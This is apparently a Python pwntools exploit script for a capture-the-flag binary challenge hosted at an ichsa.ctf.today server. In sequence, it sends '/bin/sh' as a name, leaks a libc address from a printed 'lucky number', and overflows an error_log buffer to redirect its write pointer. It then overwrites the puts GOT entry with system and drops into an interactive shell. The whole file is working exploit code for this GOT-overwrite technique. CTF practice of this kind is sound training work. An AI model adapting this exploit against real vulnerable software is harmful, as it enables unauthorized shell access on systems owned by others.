from pwn import *

elf = ELF('./app.out')
TARGET_LIBC = "libc.so.6"

if args.REMOTE:
    libc = ELF(TARGET_LIBC, checksec=False)
    p = remote('epic_game.ichsa.ctf.today',8007)
else:
    #p = gdb.debug(elf.path)
    libc = elf.libc
    p = process(elf.path)

CHOICE_STR = b"Your Choice:\n"
RAND_LIBC_PREFIX_STR = b"Your lucky number is "

# Send /bin/sh as name (because we overwrite puts and the name is the argument of the first call of puts - it's lead to be the 1st argument of system)
with log.progress("Step 1: Send /bin/sh as name"):
    p.sendlineafter("Your Choice:\n", "1")
    p.sendlineafter("Your Choice:\n", "/bin/sh")

# Leak libc address from current_player.luck
with log.progress("Step 2: Leak lib address"):
    p.recvuntil(RAND_LIBC_PREFIX_STR)
    libc_rand = int(p.recvline())
    libc.address = libc_rand - libc.sym.rand

    log.success(f"libc address {hex(libc.address)}")

# Get error_log limit by sending 515 * A twice (to make curr=1032)
with log.progress("Step 3: Write 1032 bytes to error_log (curr=1032)"):
    p.sendlineafter(CHOICE_STR, cyclic(515))
    p.sendlineafter(CHOICE_STR, cyclic(515))

# Write into curr the address of puts (minus 9 bytes we just written) and overwrite puts GOT with system
with log.progress("Step 4: Overwrite curr and puts addresses"):
    len_written=len(p64(elf.got["puts"] - elf.sym.error_log, sign="signed")) + len("\n")
    p.sendlineafter(CHOICE_STR, p64(elf.got["puts"] - elf.sym.error_log - len_written, sign="signed"))
    p.sendlineafter(CHOICE_STR, p64(libc.sym.system))


p.interactive()